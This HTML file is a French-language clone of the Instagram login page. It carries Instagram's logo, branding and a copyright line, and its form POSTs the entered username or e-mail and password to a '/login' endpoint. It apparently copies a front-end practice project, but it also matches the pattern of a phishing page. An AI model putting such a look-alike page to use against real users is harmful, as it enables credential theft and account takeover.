<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <link href="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/img/insta-fav.ico" rel="icon" type="image/png" />
    <title>Clone Instagram</title>
    <style type="text/css">
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px; /* Padding for smaller screens */
        }

        .flex {
            display: flex;
        }

        .align-items-center {
            align-items: center;
        }

        .justify-content-center {
            justify-content: center;
        }

        .direction-column {
            flex-direction: column;
        }

        .panel {
            background-color: white;
            border-radius: 1em;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 2em;
            width: 100%;
            max-width: 400px; /* Set a maximum width for larger screens */
        }

        h1 {
            margin-bottom: 20px;
            text-align: center; /* Center text */
        }

        img {
            width: 100%;
            margin: 10px 0;
        }

        input {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            width: 100%;
            font-size: 1em; /* Ensure consistent font size */
        }

        button {
            background-color: #0095f6;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 1em; /* Ensure consistent font size */
        }

        button:hover {
            background-color: #007bbf;
        }

        .separator {
            margin: 20px 0;
        }

        .login-with-fb {
            margin-top: 10px;
            text-align: center; /* Center the Facebook login section */
        }

        .app-download {
            margin-top: 20px;
            text-align: center; /* Center the app download section */
        }

        footer {
            margin-top: 20px;
            font-size: 0.9em;
            color: #999;
            text-align: center; /* Center the footer text */
        }

        footer ul {
            list-style: none;
            padding: 0;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }

        footer ul li {
            margin: 0 10px;
        }

        footer ul li a {
            color: #999;
            text-decoration: none;
        }

        footer .copyright {
            margin-top: 10px;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            body {
                padding: 10px; /* Reduce padding for smaller screens */
            }

            .panel {
                padding: 1.5em; /* Reduce padding in panel for smaller screens */
            }

            img {
                width: 80%; /* Adjust image size for smaller screens */
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.5em; /* Adjust font size for mobile */
            }

            button {
                font-size: 0.9em; /* Adjust button size for mobile */
            }

            input {
                font-size: 0.9em; /* Adjust input size for mobile */
            }

            footer {
                font-size: 0.8em; /* Adjust footer size for mobile */
            }
        }
    </style>
</head>
<body>
<main class="flex align-items-center justify-content-center">
<section class="flex" id="mobile">&nbsp;</section>

<section class="flex direction-column" id="auth">
<div class="panel login flex direction-column">
<h1 title="Instagram">
    <img alt="Instagram logo" src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/img/instagram-logo.png" title="Instagram logo" />
</h1>

<form action="/login" method="POST">
    <label class="sr-only" for="email">T&eacute;l&eacute;phone, nom d&#39;utilisateur ou e-mail</label>
    <input name="email" placeholder="Téléphone, nom d'utilisateur ou e-mail" required="" />
    <label class="sr-only" for="password">Mot de passe</label>
    <input name="password" placeholder="Mot de passe" required="" type="password" />
    <button type="submit">Se connecter</button>
</form>
</div>

<div class="panel register flex justify-content-center">
    <p>Vous n&#39;avez pas de compte ?</p>
    <a href="#">Inscrivez-vous</a>
</div>

<div class="app-download flex direction-column align-items-center">
    <p>T&eacute;l&eacute;chargez l&#39;application.</p>
    <div class="flex justify-content-center">
        <img alt="Apple Store" src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/img/apple-button.png" style="width: 40%; max-width: 150px;" title="Apple Store" />
        <img alt="Google Play" src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/master/img/googleplay-button.png" style="width: 40%; max-width: 150px;" title="Google Play" />
    </div>
</div>
</section>
</main>

<footer>
<ul class="flex flex-wrap justify-content-center">
    <li><a href="#">&Agrave; propos</a></li>
    <li><a href="#">Aide</a></li>
    <li><a href="#">Presse</a></li>
    <li><a href="#">API</a></li>
    <li><a href="#">Carri&egrave;res</a></li>
    <li><a href="#">Confidentialit&eacute;</a></li>
    <li><a href="#">Conditions</a></li>
    <li><a href="#">Localisation</a></li>
    <li><a href="#">Comptes les plus pertinents</a></li>
    <li><a href="#">Hashtags</a></li>
    <li><a href="#">Langue</a></li>
</ul>

<p class="copyright">&copy; 2024 Instagram de Facebook</p>
</footer>
</body>
</html>
